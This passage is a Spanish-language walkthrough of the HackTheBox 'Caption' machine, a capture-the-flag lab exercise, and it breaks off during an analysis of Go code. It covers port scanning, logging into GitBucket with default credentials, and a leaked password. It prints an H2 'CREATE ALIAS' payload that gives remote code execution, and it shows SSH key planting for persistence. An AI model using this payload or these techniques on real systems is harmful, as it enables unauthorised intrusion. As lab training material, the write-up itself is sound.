+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ sudo nmap --top-ports <span style="color:#ff0;font-weight:bold">1500</span> -sU --min-rate <span style="color:#ff0;font-weight:bold">5000</span> -n -Pn 10.129.230.251 -oN allPorts.UDP
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-15 18:47 CEST
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Nmap scan report for 10.129.230.251
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Host is up (0.036s latency).
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>Not shown: 1494 open|filtered udp ports (no-response)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>PORT      STATE  SERVICE
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>120/udp   closed cfdptkt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>1049/udp  closed td-postman
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>26219/udp closed unknown
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>31625/udp closed unknown
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>41702/udp closed unknown
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>61319/udp closed unknown
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span><span style="color:#f00"></span>Nmap done: 1 IP address (1 host up) scanned in 0.83 seconds
+</span></span></code></pre></div>
+<p>Del escaneo inicial detectamos dos cosas interesantes, un dominio <code>caption.htb</code> que vamos a añadir al <code>/etc/hosts</code> y una instancia de <code>GitBucket</code> en el puerto 8080.</p>
+<h1 id="http-enumeration">HTTP Enumeration</h1>
+<p><code>whatweb</code> nos reporta que nos enfrentamos contra un Flask probablemente y una cabecera un poco extraña, <code>x-varnish</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ whatweb http://caption.htb
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>http://caption.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.1 Python/3.10.12], IP[10.129.230.251], PasswordField[password], Python[3.10.12], Script, Title[Caption Portal Login], UncommonHeaders[x-varnish], Varnish, Via-Proxy[1.1 varnish (Varnish/6.6)], Werkzeug[3.0.1], X-UA-Compatible[IE=edge]
+</span></span></code></pre></div>
+<p>Vemos un panel de inicio de sesión.
+<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
+<p>Como es una instancia de Flask, es común encontrarse en algunas un endpoint <code>/console</code> con una consola que normalmente está protegida con un PIN, pero no es el caso.
+<img src="images/Screenshot_2.png" alt="Write-up Image"></p>
+<p>Con <code>feroxbuster</code> al fuzzear encontramos algunas rutas interesantes.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ feroxbuster -u http://caption.htb -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -d <span style="color:#ff0;font-weight:bold">1</span> -t <span style="color:#ff0;font-weight:bold">100</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>403      GET        4l        8w       94c http://caption.htb/download
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>200      GET      208l      330w     4412c http://caption.htb/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>302      GET        5l       22w      189c http://caption.htb/home =&gt; http://caption.htb/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>403      GET        4l        8w       94c http://caption.htb/Download
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>302      GET        5l       22w      189c http://caption.htb/logout =&gt; http://caption.htb/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>302      GET        5l       22w      189c http://caption.htb/firewalls =&gt; http://caption.htb/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>403      GET        4l        8w       94c http://caption.htb/logs
+</span></span></code></pre></div>
+<p><img src="images/Screenshot_3.png" alt="Write-up Image"></p>
+<p>Por ahora no puedo hacer nada, así que vamos a enumerar el <code>GitBucket</code>.</p>
+<h1 id="gitbucket-enumeration">GitBucket Enumeration</h1>
+<p>No vemos ningún repositorio público.
+<img src="images/Screenshot_5.png" alt="Write-up Image"></p>
+<p>Buscando las credenciales por defecto son <code>root:root</code>
+<img src="images/Screenshot_4.png" alt="Write-up Image"></p>
+<p>Y podemos iniciar sesión.
+<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
+<h2 id="enumerating-gitbucket-projects">Enumerating GitBucket Projects</h2>
+<p>El proyecto de <code>Caption-Portal</code> se refiere al sitio web que hemos visto antes.
+Podemos ver que <code>varnish</code> se encuentra en el puerto 8000 interno.
+<img src="images/Screenshot_7.png" alt="Write-up Image"></p>
+<p>También vemos que existe otro servicio interno en el puerto 6081.
+<img src="images/Screenshot_8.png" alt="Write-up Image"></p>
+<p>Revisando los commits nos encontramos unas credenciales. <code>margo:vFr&amp;cS2#0!</code>
+<img src="images/Screenshot_9.png" alt="Write-up Image"></p>
+<p>Con ellas podemos iniciar sesión pero el sitio se ve muy estático y no encuentro nada relevante.
+<img src="images/Screenshot_10.png" alt="Write-up Image"></p>
+<p>El token JWT es muy minimalista y no contiene ni información sobre los roles.
+<img src="images/Screenshot_11.png" alt="Write-up Image"></p>
+<p>También vemos otro proyecto llamado <code>Logservice</code> hecho en Go.
+<img src="images/Screenshot_20.png" alt="Write-up Image"></p>
+<p>Rápidamente vemos que está aplicando una expresión regular sobre un capo <code>User-Agent</code> y que este programa está en escucha en el puerto 9090 interno de la máquina. Por ahora no podemos hacer nada.
+<img src="images/Screenshot_21.png" alt="Write-up Image"></p>
+<h2 id="abusing-h2---rce---foothold">Abusing H2 -&gt; RCE -&gt; Foothold</h2>
+<p>Viendo la configuración de la instancia de  <code>GitBucket</code> podemos ver que la base de datos que se utiliza por detrás es H2, y vemos una ruta. <code>/home/margo/.gitbucket</code>
+<img src="images/Screenshot_12.png" alt="Write-up Image"></p>
+<p>Y vemos esta opción que parece interesante. <code>Database viewer</code>
+<img src="images/Screenshot_13.png" alt="Write-up Image"></p>
+<p>Buscando un poco me encontré <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/h2-java-sql-database">este post en HackTricks</a> que nos muestra como podemos conseguir RCE a través de una instancia de una base de datos H2.</p>
+<p>Nos vamos a descargar este archivo.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ wget https://gist.githubusercontent.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed/raw/152ffcd996497e01cfee1ceb7237375f1a1e72f2/h2-exploit.py
+</span></span></code></pre></div>
+<p>Analizando el exploit vemos que utiliza este payload.</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { 
+    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&#34;\\A&#34;); 
+    return s.hasNext() ? s.next() : &#34;&#34;;  }$$;</code></pre>
+<p>Nos lo vamos a copiar y lo ejecutamos en el <code>dbviewer</code></p>
+<p>Vemos que todo ha salido bien.
+<img src="images/Screenshot_14.png" alt="Write-up Image"></p>
+<p>Ahora si intentamos usar el exploit que hemos utilizado vemos que conseguimos RCE.
+<img src="images/Screenshot_16.png" alt="Write-up Image"></p>
+<p>Pero por alguna razón no puedo mandarme la reverse shell.
+<img src="images/Screenshot_15.png" alt="Write-up Image"></p>
+<p>Vemos que el usuario <code>margo</code> tiene una clave privada.
+<img src="images/Screenshot_17.png" alt="Write-up Image"></p>
+<p>Utilizando esta clave privada no podemos iniciar sesión por SSH.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ ssh -i /home/pointedsec/.ssh/id_rsa margo@caption.htb
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>margo@caption.htb&#39;s password: 
+</span></span></code></pre></div>
+<p>Vamos a añadir mi clave pública al <code>authorized_keys</code> de <code>margo</code> para intentar iniciar sesión de esta manera.</p>
+<p>Nos copiamos mi clave pública como <code>authorized_keys</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ cp /home/pointedsec/.ssh/id_rsa.pub authorized_keys
+</span></span></code></pre></div>
+<p>La servimos por el puerto 8081.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ python3 -m http.server <span style="color:#ff0;font-weight:bold">8081</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
+</span></span></code></pre></div>
+<p>Ahora la descargamos en la máquina víctima.
+<img src="images/Screenshot_18.png" alt="Write-up Image"></p>
+<p>Vemos que me llega una solicitud.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ python3 -m http.server <span style="color:#ff0;font-weight:bold">8081</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>10.129.230.251 - - [15/Sep/2024 19:29:55] &#34;GET /authorized_keys HTTP/1.1&#34; 200 -
+</span></span></code></pre></div>
+<p>Podemos comprobar que todo ha salido bien.
+<img src="images/Screenshot_19.png" alt="Write-up Image"></p>
+<p>Y ya simplemente podemos iniciar sesión por SSH.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ ssh margo@caption.htb
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-119-generic x86_64)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span><span style="color:#f00"></span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span> * Support:        https://ubuntu.com/pro
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span><span style="color:#f00"></span> System information as of Sun Sep 15 05:32:29 PM UTC 2024
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span><span style="color:#f00"></span>  System load:  0.08              Processes:             234
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>  Usage of /:   69.2% of 8.76GB   Users logged in:       0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>  Memory usage: 29%               IPv4 address for eth0: 10.129.230.251
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>  Swap usage:   0%
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span><span style="color:#f00"></span>Expanded Security Maintenance for Applications is not enabled.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span><span style="color:#f00"></span>0 updates can be applied immediately.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span><span style="color:#f00"></span>3 additional security updates can be applied with ESM Apps.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span><span style="color:#f00"></span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span><span style="color:#f00"></span>Last login: Sun Sep 15 17:30:42 2024 from 10.10.14.104
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span>margo@caption:~$ id
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span>uid=1000(margo) gid=1000(margo) groups=1000(margo)
+</span></span></code></pre></div>
+<p>Podemos leer la flag de usuario.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>margo@caption:~$ cat user.txt 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>bd2fa255c446bc...
+</span></span></code></pre></div>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>Encontramos otro usuario llamado <code>ruth</code> en el sistema.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>margo@caption:~$ cat /etc/passwd | grep bash
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>margo:x:1000:1000:,,,:/home/margo:/bin/bash
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>ruth:x:1001:1001:,,,:/home/ruth:/bin/bash
+</span></span></code></pre></div>
+<p>Enumerando puertos internos nos encontramos varios interesantes, algunos los habíamos visto antes.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>margo@caption:~$ netstat -tulnp
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>(Not all processes could be identified, non-owned process info
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span> will not be shown, you would have to be root to see it all.)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Active Internet connections (only servers)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>tcp        0      0 127.0.0.1:6082          0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>tcp        0      0 127.0.0.1:6081          0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      1033/java           
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>tcp        0      0 127.0.0.1:3923          0.0.0.0:*               LISTEN      1043/python3        
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      1034/python3        
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
+</span></span></code></pre></div>
+<p>El que mas me llama la atención es el puerto 9090 ya que corresponde al programa escrito en Go que hemos visto antes.</p>
+<h2 id="port-forwarding">Port Forwarding</h2>
+<p>Me voy a compartir este puerto a mi máquina para jugar con la aplicación.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ ssh margo@caption.htb -L 9090:127.0.0.1:9090
+</span></span></code></pre></div>
+<h2 id="go-code-analysis">Go Code Analysis</h2>
+<p>Vemos que se utiliza una dependencia llamada <code>thrift</code>.</p>
+<blockquote>
+<p>Apache Thrift es un protocolo implementado en los procesos de la gestión de los macrodatos. De manera que este, prácticamente, es un protocolo que permite pasar objetos en binario a partir de un código generado.</p>
+</blockquote>
+<p>Y vemos un archivo <code>log_service.thrift</code> por lo cual quiero pensar que a través del protocolo se está pasando este objeto que lo que hace es leer un archivo.
+<img src="images/Screenshot_22.png" alt="Write-up Image"></p>
+<p>Esto significa que nos podemos comunicar con el servidor a través de un cliente siempre que tengamos este objeto para poder emitir a través del protocolo Thrift. Es decir, la petición que le vamos a hacer al servidor tiene que ser utilizando este objeto que sirve para leer un log.</p>
+<p><strong>ReadLogFile(ctx context.Context, filePath string)</strong></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span><span style="color:#fff;font-weight:bold">func</span> (l *LogServiceHandler) ReadLogFile(ctx context.Context, filePath <span style="color:#fff;font-weight:bold">string</span>) (r <span style="color:#fff;font-weight:bold">string</span>, err <span style="color:#fff;font-weight:bold">error</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>    file, err := os.Open(filePath)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>    <span style="color:#fff;font-weight:bold">if</span> err != <span style="color:#fff;font-weight:bold">nil</span> {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#34;&#34;</span>, fmt.Errorf(<span style="color:#0ff;font-weight:bold">&#34;error opening log file: %v&#34;</span>, err)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>    }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>    <span style="color:#fff;font-weight:bold">defer</span> file.Close()
